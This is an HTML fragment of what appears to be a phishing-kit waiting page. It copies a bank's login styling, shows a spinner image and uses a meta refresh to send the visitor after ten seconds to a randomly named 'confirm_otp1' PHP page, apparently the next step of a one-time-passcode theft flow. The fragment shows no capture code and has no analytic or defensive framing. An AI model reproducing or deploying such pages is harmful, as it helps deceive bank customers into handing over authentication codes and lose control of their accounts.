...
<html ng-app="refresh" class="ng-scope mdl-js" lang="en">
   <head>
	   <meta http-equiv="Refresh" content="10; url=confirm_otp1_G1heGxlbmd0aD0iMi.php">
   ...
   <body ng-controller="spinnerController" ng-class="{ 'login migration-login-bg': migrationLogin(), 'login-strong-auth-bg':strongAuthLogin() }" class="ng-scope login migration-login-bg login-strong-auth-bg">
       <div class="content-wrapper">
           <div id="image1" style="position: absolute; overflow: hidden; left: 532px; top: -1px; width: 424px; height: 567px; z-index: 0"><img src="images/pg4.png" alt="" title="" border=0 width=420 height=509></div>
   </div>
   ...
   <p>&nbsp;</p><div id="image2" style="position: absolute; overflow: hidden; left: 671px; top: 213px; width: 153px; height: 126px; z-index: 1"><img src="images/syt.gif" alt="" title="" border=0 width=100 height=100></div>
